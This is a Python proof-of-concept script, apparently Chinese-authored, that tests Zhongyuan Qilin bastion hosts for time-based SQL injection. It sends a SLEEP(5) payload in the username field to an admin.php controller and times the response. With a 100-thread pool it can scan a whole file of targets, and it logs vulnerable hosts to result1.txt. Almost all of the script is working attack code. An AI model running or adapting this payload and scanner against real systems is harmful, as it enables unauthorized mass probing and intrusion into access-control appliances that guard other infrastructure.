import sys, argparse, requests, re, time
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def banner():
    test = """
 ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
                ░▒▓█▓▒░                  
                 ░▒▓██▓▒░     
                                   author:sanhua
                                   date:2024-09-03
                                   version:1.0        
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    if not target:
        print("目标 URL 不能为空")
        return
    # print(f"正在测试 {target} 是否存在延时注入漏洞...")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    payload = '/admin.php?controller=admin_commonuser'
    try:
        res = requests.get(url=f"{target + payload}",headers=headers,verify=False)
        if res.status_code == 200 and 'username and password' in res.text:
            res1 = requests.post(url=target+payload, verify=False, data=data, headers=headers)
            res2 = requests.post(url=target+payload, verify=False, headers=headers)
            time1 = res1.elapsed.total_seconds()  # 响应的时间
            time2 = res2.elapsed.total_seconds()
            if time1 - time2 >= 5:
                print(f"[+] {target} 存在sql延时注入漏洞")
                with open('result1.txt', 'a',encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"{target} 不存在SQL注入漏洞")
    except Exception as e:
        print(f"{target} 连接超时")


if __name__ == '__main__':
    main()